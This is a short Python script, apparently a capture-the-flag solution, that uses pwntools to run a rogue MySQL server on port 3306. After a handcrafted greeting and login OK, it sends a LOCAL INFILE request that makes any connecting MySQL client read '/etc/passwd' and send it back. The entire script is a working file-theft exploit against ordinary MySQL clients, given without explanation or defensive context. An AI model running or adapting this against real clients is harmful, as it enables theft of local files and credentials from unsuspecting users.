#!/usr/bin/env python3
# Python 3.6.4
from pwn import *

server = listen(3306)

server.wait_for_connection()
# Server Greeting
server.send(bytes.fromhex('4a0000000a352e372e32310007000000447601417b4f123700fff7080200ff8115000000000000000000005c121c5e6f7d387a4515755b006d7973716c5f6e61746976655f70617373776f726400'))
# Client login request
print(server.recv())
# Server Response OK
server.send(bytes.fromhex('0700000200000002000000'))
# Client SQL query
print(server.recv())
# Server response with evil
query_ok = bytes.fromhex('0700000200000002000000')
dump_etc_passwd = bytes.fromhex('0c000001fb2f6574632f706173737764')
server.send(dump_etc_passwd)

# This contains the flag
print(server.recv())
